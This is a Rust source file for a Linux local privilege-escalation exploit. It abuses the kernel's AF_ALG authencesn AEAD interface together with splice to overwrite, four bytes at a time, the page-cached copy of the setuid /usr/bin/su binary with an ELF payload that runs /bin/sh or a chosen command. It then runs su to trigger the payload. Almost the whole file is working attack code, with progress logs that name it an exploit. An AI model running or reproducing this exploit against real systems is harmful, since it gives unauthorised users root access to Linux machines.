mod elf;
mod logger;

use std::env;
use std::fs::File;
use std::io;
use std::os::unix::io::{AsRawFd, FromRawFd, OwnedFd};

use hex::FromHex;
use logger::Logger;

// Constants from linux/if_alg.h
const AF_ALG: i32 = 38;
const SOCK_SEQPACKET: i32 = 5;
const SOL_ALG: i32 = 279;
const ALG_SET_KEY: i32 = 1;
const ALG_SET_AEAD_AUTHSIZE: i32 = 5;
const ALG_SET_OP: i32 = 3;
const ALG_SET_IV: i32 = 2;
const ALG_SET_AEAD_ASSOCLEN: i32 = 4;

#[repr(C)]
struct sockaddr_alg {
    salg_family: libc::sa_family_t,
    salg_type: [libc::c_uchar; 14],
    salg_feat: u32,
    salg_mask: u32,
    salg_name: [libc::c_uchar; 64],
}

fn decode_hex(hex: &str) -> Vec<u8> {
    Vec::from_hex(hex).expect("invalid hex string")
}

fn crypto_op(
    file: &File,
    offset: usize,
    chunk: &[u8],
    log: &Logger,
    verbose: bool,
) -> io::Result<()> {
    // 1. Create AF_ALG socket
    let sock_fd = unsafe { libc::socket(AF_ALG, SOCK_SEQPACKET, 0) };
    if sock_fd < 0 {
        let err = io::Error::last_os_error();
        log.error(&format!("Failed to create AF_ALG socket: {}", err));
        return Err(err);
    }
    if verbose {
        log.debug("AF_ALG socket created.");
    }
    let sock = unsafe { OwnedFd::from_raw_fd(sock_fd) };

    // 2. Bind to AEAD
    let mut addr: sockaddr_alg = unsafe { std::mem::zeroed() };
    addr.salg_family = AF_ALG as libc::sa_family_t;
    let alg_type = b"aead";
    let alg_name = b"authencesn(hmac(sha256),cbc(aes))";
    addr.salg_type[..alg_type.len()].copy_from_slice(alg_type);
    addr.salg_name[..alg_name.len()].copy_from_slice(alg_name);

    let ret = unsafe {
        libc::bind(
            sock.as_raw_fd(),
            &addr as *const _ as *const libc::sockaddr,
            std::mem::size_of::<sockaddr_alg>() as libc::socklen_t,
        )
    };
    if ret != 0 {
        let err = io::Error::last_os_error();
        log.error(&format!("Failed to bind AF_ALG socket: {}", err));
        return Err(err);
    }
    if verbose {
        log.debug("Socket bound to authencesn algorithm.");
    }

    // 3. Set key and authsize
    let key_hex = "0800010000000010".to_owned() + &"0".repeat(64);
    let key = decode_hex(&key_hex);
    unsafe {
        if libc::setsockopt(
            sock.as_raw_fd(),
            SOL_ALG,
            ALG_SET_KEY,
            key.as_ptr() as *const libc::c_void,
            key.len() as libc::socklen_t,
        ) != 0
        {
            log.error("Failed to set ALG_SET_KEY");
        }
        if verbose {
            log.debug("Cryptographic key configured.");
        }

        if libc::setsockopt(
            sock.as_raw_fd(),
            SOL_ALG,
            ALG_SET_AEAD_AUTHSIZE,
            std::ptr::null(),
            4,
        ) != 0
        {
            log.error("Failed to set ALG_SET_AEAD_AUTHSIZE");
        }
        if verbose {
            log.debug("AEAD authsize initialized.");
        }
    }

    // 4. Accept connection
    let accept_fd =
        unsafe { libc::accept(sock.as_raw_fd(), std::ptr::null_mut(), std::ptr::null_mut()) };
    if accept_fd < 0 {
        let err = io::Error::last_os_error();
        log.error(&format!("Failed to accept on AF_ALG socket: {}", err));
        return Err(err);
    }
    if verbose {
        log.debug("Kernel connection accepted.");
    }
    let client = unsafe { OwnedFd::from_raw_fd(accept_fd) };

    // 5. Send Control Messages
    let assoc_data = [b'A'; 4]
        .iter()
        .chain(chunk.iter())
        .copied()
        .collect::<Vec<_>>();
    let op_data = [0u8; 4];
    let iv_data = {
        let mut iv = vec![0u8; 20];
        iv[0] = 0x10;
        iv
    };
    let assoclen_data = {
        let mut alen = vec![0u8; 4];
        alen[0] = 0x08;
        alen
    };

    let (cmsg1_len, cmsg2_len, cmsg3_len) = unsafe {
        (
            libc::CMSG_SPACE(4) as usize,
            libc::CMSG_SPACE(20) as usize,
            libc::CMSG_SPACE(4) as usize,
        )
    };
    let total_cmsg_len = cmsg1_len + cmsg2_len + cmsg3_len;
    let mut cmsg_buf = vec![0u8; total_cmsg_len];
    let mut cmsg_offset = 0;

    macro_rules! add_cmsg {
        ($level:expr, $type:expr, $data:expr) => {{
            let len = $data.len();
            unsafe {
                let cmsg_len = libc::CMSG_LEN(len as u32) as usize;
                let ptr = cmsg_buf.as_mut_ptr().add(cmsg_offset) as *mut libc::cmsghdr;
                (*ptr).cmsg_len = cmsg_len as _;
                (*ptr).cmsg_level = $level;
                (*ptr).cmsg_type = $type;
                let data_ptr = libc::CMSG_DATA(ptr);
                std::ptr::copy_nonoverlapping($data.as_ptr(), data_ptr, len);
                cmsg_offset += libc::CMSG_SPACE(len as u32) as usize;
            }
        }};
    }

    add_cmsg!(SOL_ALG, ALG_SET_OP, &op_data);
    add_cmsg!(SOL_ALG, ALG_SET_IV, &iv_data);
    add_cmsg!(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, &assoclen_data);

    let iovec = libc::iovec {
        iov_base: assoc_data.as_ptr() as *mut libc::c_void,
        iov_len: assoc_data.len(),
    };
    let mut msghdr: libc::msghdr = unsafe { std::mem::zeroed() };
    msghdr.msg_iov = &iovec as *const _ as *mut libc::iovec;
    msghdr.msg_iovlen = 1;
    msghdr.msg_control = cmsg_buf.as_mut_ptr() as *mut libc::c_void;
    msghdr.msg_controllen = total_cmsg_len as _;

    if unsafe { libc::sendmsg(client.as_raw_fd(), &msghdr, 0x8000) } < 0 {
        log.error("Failed to sendmsg on client socket");
    }
    if verbose {
        log.debug("Control messages dispatched.");
    }

    // 6. Pipe and Splice
    let mut pipe_fds = [0i32; 2];
    if unsafe { libc::pipe(pipe_fds.as_mut_ptr()) } != 0 {
        let err = io::Error::last_os_error();
        log.error(&format!("Failed to create pipe: {}", err));
        return Err(err);
    }
    let (read_pipe, write_pipe) = (pipe_fds[0], pipe_fds[1]);

    let len = offset + 4;
    let mut src_offset: libc::off_t = 0;
    unsafe {
        if libc::splice(
            file.as_raw_fd(),
            &mut src_offset,
            write_pipe,
            std::ptr::null_mut(),
            len,
            0,
        ) < 0
        {
            log.error("Splice from file to pipe failed");
        }
        if libc::splice(
            read_pipe,
            std::ptr::null_mut(),
            client.as_raw_fd(),
            std::ptr::null_mut(),
            len,
            0,
        ) < 0
        {
            log.error("Splice from pipe to socket failed");
        }
        if verbose {
            log.debug(&format!("Spliced {} bytes into page cache.", len));
        }

        let recv_len = 8 + offset;
        let mut recv_buf = vec![0u8; recv_len];
        libc::recv(
            client.as_raw_fd(),
            recv_buf.as_mut_ptr() as *mut libc::c_void,
            recv_len,
            0,
        );

        libc::close(read_pipe);
        libc::close(write_pipe);
    }

    Ok(())
}

fn main() -> io::Result<()> {
    let all_args: Vec<String> = env::args().collect();
    let mut silent = false;
    let mut verbose = false;
    let mut target_command = "/bin/sh";
    let mut positional_args = Vec::new();

    for arg in all_args.iter().skip(1) {
        match arg.as_str() {
            "-s" | "--silent" => silent = true,
            "-v" | "--verbose" => verbose = true,
            _ => positional_args.push(arg),
        }
    }

    if !positional_args.is_empty() {
        target_command = positional_args[0];
    }

    let log = Logger::new(silent);

    let payload = elf::build_elf_payload(target_command);
    log.info(&format!(
        "Exploit payload constructed for command: {}",
        target_command
    ));

    let su_file = match File::open("/usr/bin/su") {
        Ok(f) => {
            log.info("Target binary (/usr/bin/su) opened.");
            f
        }
        Err(e) => {
            log.error(&format!("Could not open /usr/bin/su: {}.", e));
            return Err(e);
        }
    };

    let mut i = 0;
    let total_chunks = (payload.len() + 3) / 4;
    while i < payload.len() {
        let current_chunk = (i / 4) + 1;
        let chunk_end = std::cmp::min(i + 4, payload.len());
        let chunk = &payload[i..chunk_end];

        if let Err(e) = crypto_op(&su_file, i, chunk, &log, verbose) {
            log.error(&format!("Exploit failed at offset {}: {}", i, e));
            return Err(e);
        }

        if verbose || current_chunk % 10 == 0 || i + 4 >= payload.len() {
            log.info(&format!(
                "Page cache injection progress: {}/{} chunks.",
                current_chunk, total_chunks
            ));
        }
        i += 4;
    }

    log.info("All payload chunks successfully injected into page cache.");
    log.info("Triggering exploit via 'su' execution...");

    unsafe {
        let ret = libc::system(b"su\0".as_ptr() as *const libc::c_char);
        if ret == -1 {
            log.error("Failed to execute 'su' binary.");
        } else {
            log.info(&format!("Exploit execution finished (exit code {}).", ret));
        }
    }

    Ok(())
}
